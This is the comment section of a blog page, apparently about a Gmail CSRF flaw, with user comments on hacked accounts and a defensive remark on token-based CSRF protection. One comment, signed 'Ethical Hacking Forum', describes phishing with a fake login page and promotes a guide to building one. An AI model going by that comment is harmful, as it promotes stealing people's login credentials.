2. i just discovered gmail messages can be 'deleted forever' so one may never know what emails have been sent/received. this is not a good idea from Gmail. all historic entries should be traceable from the logs.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/9c95c9b3c7f9be55811b3e8f61057cdc?s=256&amp;d=retro" alt="John Woodz"><span class="post-comment-author">John Woodz</span><div class="post-comment-content">Was once hacked by watever means i dont know but all contact addresses in my account were being send an email using my gmail account by some hacker perporting to be me.! since am a general mind i stopped using gmail was the best i kuld do i hav no idea about java scripting or watever technical terms u talkn here bt i just wana be safe do i doubt technogy en go stone age !</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/268fdb66013b277b2cac61eccb0b793c?s=256&amp;d=retro" alt="Janet"><span class="post-comment-author">Janet</span><div class="post-comment-content">wow i didnt know that was possible!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/dbed6c9ad6e12ced4d9af8491a96ba75?s=256&amp;d=retro" alt="video videolar"><span class="post-comment-author">video videolar</span><div class="post-comment-content">Nicolae, refers can be spoofed, not to mention that you can configure your browser not to send them at all. Therefore, CSRF protection based on refers only is not a solution. The only solution is to implement random tokens per request and store their values within the form you want to check for a CSRF condition. This works and this is what the Google folks tried to do, although their implementation was seriously flawed.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5f2003fdaed6012162d2645206a4e606?s=256&amp;d=retro" alt="Ethical Hacking Forum"><span class="post-comment-author">Ethical Hacking Forum</span><div class="post-comment-content">Phishing - Phishing is by far the most used and easiest method. The attacker simply sets up a page that looks exactly like the real email login page and tricks people into entering their login information.

Update: Check out the new post on how to create your own phishing page here.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/16cbd07df54e786e703f6c834d76ab0e?s=256&amp;d=retro" alt="Roger"><span class="post-comment-author">Roger</span><div class="post-comment-content">I've been once hacked too, it's rather an unpleasant experience. However Gmail looks fine now, I guess the problem was fixed then. I created a new Google account half a year ago and faced no more similar problems.</div></div></div></div></article><footer id="footer"><p>Copyright &copy; 2020 <a href=""></a>. All rights reserved.</p></footer></body></html>